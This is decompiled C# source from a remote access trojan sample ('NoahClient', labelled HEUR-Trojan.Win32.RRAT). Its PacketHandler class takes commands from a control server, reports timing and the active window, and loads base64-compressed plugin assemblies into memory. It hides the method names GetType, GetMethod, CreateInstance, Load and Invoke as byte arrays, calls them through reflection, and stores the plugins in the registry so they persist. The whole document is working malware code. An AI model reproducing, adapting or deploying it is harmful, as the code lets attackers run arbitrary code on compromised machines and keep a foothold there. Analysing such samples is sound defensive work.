// Decompiled with JetBrains decompiler
// Type: PacketHandler
// Assembly: NoahClient, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A55B7EB4-612C-4348-ADA6-5D647EA578AF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.RRAT.gen-3378488a2930d73c433e9bbedbeb9065753dd5e236552aa80dd553a7e73ce693.exe

using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Text;
using System.Windows.Forms;

public class PacketHandler
{
  public void Handler(object packet)
  {
    try
    {
      string key = Config.key;
      string[] strArray = Strings.Split(StringConverter.BytestoString((byte[]) packet), key, Compare: CompareMethod.Text);
      if (strArray[0] == "PNC")
      {
        Config.stopwatch.Reset();
        Config.stopwatch.Start();
        Client.TcpSend("PNC");
      }
      else if (strArray[0] == "P")
      {
        Config.stopwatch.Stop();
        Client.TcpSend("P" + key + (object) Config.stopwatch.ElapsedMilliseconds);
        Client.TcpSend("W" + key + IdGenerator.GetActiveWindow());
      }
      else if (strArray[0] == "IE")
      {
        if (Registry.CurrentUser.OpenSubKey("Software\\" + StringConverter.Encode(Config.currentMutex) + "\\" + strArray[1], true) != null)
        {
          try
          {
            this.Invoke(Config.host, Config.port, strArray[4], strArray[5], StringConverter.Encode(StringConverter.Decode(Config.id) + "_" + IdGenerator.GetHardDiskSerialNumber()), Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\\\" + strArray[1], strArray[1], (object) null).ToString(), int.Parse(strArray[2]), Convert.ToBoolean(strArray[3]), strArray[1], true);
          }
          catch
          {
            Client.TcpSend("GPL" + key + strArray[5] + key + strArray[1] + key + "false");
          }
        }
        else
          Client.TcpSend("GPL" + key + strArray[5] + key + strArray[1] + key + "false");
      }
      else if (strArray[0] == "LP")
      {
        this.Invoke(Config.host, Config.port, strArray[1], strArray[2], StringConverter.Encode(StringConverter.Decode(Config.id) + "_" + IdGenerator.GetHardDiskSerialNumber()), strArray[3], int.Parse(strArray[4]), Convert.ToBoolean(strArray[5]), strArray[6], Convert.ToBoolean(strArray[7]));
      }
      else
      {
        if (!(strArray[0] == "UNV"))
          return;
        object ObjectRef = Interaction.CallByName(Interaction.CallByName(this.GetAssembly(strArray[1]), Encoding.Default.GetString(new byte[7]
        {
          (byte) 71,
          (byte) 101,
          (byte) 116,
          (byte) 84,
          (byte) 121,
          (byte) 112,
          (byte) 101
        }), CallType.Method, (object) strArray[2]), Encoding.Default.GetString(new byte[9]
        {
          (byte) 71,
          (byte) 101,
          (byte) 116,
          (byte) 77,
          (byte) 101,
          (byte) 116,
          (byte) 104,
          (byte) 111,
          (byte) 100
        }), CallType.Method, (object) Encoding.Default.GetString(new byte[3]
        {
          (byte) 85,
          (byte) 78,
          (byte) 73
        }));
        string ProcName = Encoding.Default.GetString(new byte[6]
        {
          (byte) 73,
          (byte) 110,
          (byte) 118,
          (byte) 111,
          (byte) 107,
          (byte) 101
        });
        object[] objArray1 = new object[2];
        object[] objArray2 = objArray1;
        object[] objArray3 = new object[43];
        objArray3[0] = (object) StringConverter.Encode(Config.currentMutex);
        objArray3[1] = (object) strArray[3];
        objArray3[32] = (object) strArray[4];
        objArray3[33] = (object) strArray[5];
        objArray3[34] = (object) Application.ExecutablePath;
        objArray3[35] = (object) strArray[6];
        objArray3[36] = (object) strArray[7];
        objArray3[37] = (object) strArray[8];
        objArray3[38] = (object) strArray[9];
        objArray3[39] = (object) strArray[10];
        objArray3[40] = (object) strArray[11];
        objArray3[41] = (object) strArray[12];
        objArray3[42] = (object) strArray[13];
        object[] objArray4 = objArray3;
        objArray2[1] = (object) objArray4;
        object[] objArray5 = objArray1;
        Interaction.CallByName(ObjectRef, ProcName, CallType.Method, objArray5);
      }
    }
    catch
    {
    }
  }

  public void Invoke(
    string H,
    string P,
    string N,
    string C,
    string ID,
    string Bytes,
    int S,
    bool M,
    string MD5,
    bool B)
  {
    try
    {
      byte[] bytes1 = new byte[14]
      {
        (byte) 67,
        (byte) 114,
        (byte) 101,
        (byte) 97,
        (byte) 116,
        (byte) 101,
        (byte) 73,
        (byte) 110,
        (byte) 115,
        (byte) 116,
        (byte) 97,
        (byte) 110,
        (byte) 99,
        (byte) 101
      };
      byte[] bytes2 = new byte[5]
      {
        (byte) 83,
        (byte) 116,
        (byte) 97,
        (byte) 114,
        (byte) 116
      };
      Interaction.CallByName(Interaction.CallByName(this.GetAssembly(Bytes), Encoding.Default.GetString(bytes1), CallType.Method, (object) (N + "." + C)), Encoding.Default.GetString(bytes2), CallType.Method, (object) ID, (object) S, (object) H, (object) P, (object) Config.key, (object) Config.splitter);
      if (!M)
        return;
      try
      {
        if (Registry.CurrentUser.OpenSubKey("Software\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, true) == null)
          this.SavePlugin("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, MD5, Bytes);
      }
      catch
      {
      }
      if (B)
        return;
      this.SavePlugin("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, MD5, Bytes);
    }
    catch
    {
    }
  }

  public object GetAssembly(string bytesArray)
  {
    try
    {
      return Interaction.CallByName((object) AppDomain.CurrentDomain, Encoding.Default.GetString(new byte[4]
      {
        (byte) 76,
        (byte) 111,
        (byte) 97,
        (byte) 100
      }), CallType.Method, (object) StringConverter.Decompress(Convert.FromBase64String(bytesArray)));
    }
    catch
    {
    }
    return (object) null;
  }

  public void SavePlugin(string P, string N, string B)
  {
    try
    {
      Registry.SetValue(P, N, (object) B);
    }
    catch
    {
    }
  }
}
